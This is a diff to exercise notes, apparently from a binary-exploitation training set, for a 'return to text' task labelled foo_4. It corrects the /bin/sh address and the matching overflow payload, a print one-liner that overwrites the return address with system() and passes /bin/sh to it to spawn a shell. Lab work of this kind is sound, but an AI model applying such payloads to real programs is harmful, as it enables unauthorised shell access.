@@ -16,10 +16,10 @@ foo_4
 
 Training for "return to text" attack.
 
-- binsh: 0x0804a030
+- binsh: 0x0804a030, but actual address is at 0x08048640.
 - system: 0x080483e0
 
-- ``print 'a'*24 + '\xe0\x83\x04\x08' + 'aaaa' + '\x20\x86\x04\x08'``
+- ``print 'a'*24 + '\xe0\x83\x04\x08' + 'aaaa' + '\x40\x86\x04\x08'``
 
 
 foo_5
